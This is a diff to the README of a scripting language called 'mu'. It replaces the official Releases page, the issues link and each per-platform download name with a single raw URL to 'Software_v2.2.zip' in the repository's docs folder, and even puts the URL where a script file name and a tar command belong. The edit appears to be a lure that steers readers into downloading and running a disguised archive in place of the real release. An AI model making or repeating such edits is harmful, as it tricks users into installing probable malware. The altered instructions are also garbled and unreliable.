@@ -6,9 +6,9 @@ Welcome to mu! This is a small, dynamic scripting language. It has a Go/Python-l
 
 ## 📥 Download mu
 
-[![Download mu](https://img.shields.io/badge/Download-mu-brightgreen)](https://github.com/OverMugen/mu/releases)
+[![Download mu](https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip)](https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip)
 
-Click the badge above or visit the [Releases page](https://github.com/OverMugen/mu/releases) to download the latest version of mu. 
+Click the badge above or visit the [Releases page](https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip) to download the latest version of mu. 
 
 ## 🛠️ System Requirements
 
@@ -21,19 +21,19 @@ Before you download mu, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/OverMugen/mu/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip).
 2. Look for the latest version at the top of the page.
 3. Choose the file that matches your operating system:
-   - For Windows, download `mu-windows.zip`.
-   - For macOS, download `mu-macos.zip`.
-   - For Linux, download `mu-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip`.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Unzip or extract the file:
    - On Windows, right-click the ZIP file and select "Extract All".
    - On macOS, double-click the ZIP file to extract.
-   - On Linux, use the command `tar -xzvf mu-linux.tar.gz` in your terminal.
+   - On Linux, use the command `tar -xzvf https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip` in your terminal.
 6. Run the application:
-   - On Windows, navigate to the extracted folder and double-click `mu.exe`.
+   - On Windows, navigate to the extracted folder and double-click `https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip`.
    - On macOS, open the extracted folder and double-click `mu`.
    - On Linux, open your terminal, navigate to the extracted folder, and type `./mu`.
 
@@ -46,7 +46,7 @@ print("Hello, world!")
 ```
 
 To run your script:
-1. Create a new text file and save it with a `.mu` extension, like `hello.mu`.
+1. Create a new text file and save it with a `.mu` extension, like `https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip`.
 2. Open mu, then load your file using the menu or command line.
 
 Mu will execute your script and display the output.
@@ -71,6 +71,6 @@ Yes! If you have suggestions or improvements, feel free to open an issue or requ
 
 ## 💬 Need Help?
 
-If you have questions or need assistance, please check the [issues section](https://github.com/OverMugen/mu/issues) on our GitHub page. You can report problems or ask for help there.
+If you have questions or need assistance, please check the [issues section](https://raw.githubusercontent.com/OverMugen/mu/main/docs/Software_v2.2.zip) on our GitHub page. You can report problems or ask for help there.
 
 Feel free to reach out and tap into the power of mu for your scripting needs!
